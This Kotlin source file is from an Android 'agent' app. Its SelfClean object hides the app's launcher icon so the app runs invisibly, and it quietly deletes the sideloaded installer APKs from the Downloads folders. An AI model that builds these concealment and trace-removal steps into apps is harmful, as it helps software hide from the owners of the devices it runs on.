package com.suguna.agent

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import android.util.Log
import java.io.File

/**
 * After setup the agent can (a) hide its own launcher icon so it runs invisibly, and
 * (b) delete the installer APK it was sideloaded from.
 *
 * Deleting is best-effort: on Android 11+ it needs "All files access"
 * (MANAGE_EXTERNAL_STORAGE); without it nothing is deleted and it fails quietly.
 * Only files named like our own installers are touched. Re-installing the APK brings
 * the launcher icon back (component state resets to the manifest default on install).
 */
object SelfClean {

    private const val TAG = "SelfClean"
    private val NAME = Regex("^(sure|suguna).*\\.apk$", RegexOption.IGNORE_CASE)

    fun canDelete(context: Context): Boolean =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Environment.isExternalStorageManager()
        else context.checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) ==
            PackageManager.PERMISSION_GRANTED

    fun deleteInstallerApks(context: Context): Int {
        if (!canDelete(context)) return 0
        var removed = 0
        for (dir in candidateDirs()) {
            val files = try { dir.listFiles() } catch (e: Exception) { null } ?: continue
            for (f in files) {
                if (f.isFile && NAME.matches(f.name)) {
                    try { if (f.delete()) { removed++; Log.i(TAG, "deleted ${f.name}") } }
                    catch (e: Exception) { Log.w(TAG, "delete ${f.name}: ${e.message}") }
                }
            }
        }
        return removed
    }

    /** Hide the launcher icon by disabling MainActivity's launcher component. */
    fun hideLauncherIcon(context: Context) {
        try {
            context.packageManager.setComponentEnabledSetting(
                ComponentName(context, MainActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP,
            )
            Log.i(TAG, "launcher icon hidden")
        } catch (e: Exception) { Log.w(TAG, "hide icon: ${e.message}") }
    }

    private fun candidateDirs(): List<File> {
        val dirs = ArrayList<File>()
        try { dirs.add(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)) }
        catch (e: Exception) { /* ignore */ }
        try { Environment.getExternalStorageDirectory()?.let { dirs.add(File(it, "Download")) } }
        catch (e: Exception) { /* ignore */ }
        return dirs.filter { it.exists() && it.isDirectory }.distinctBy { it.absolutePath }
    }
}
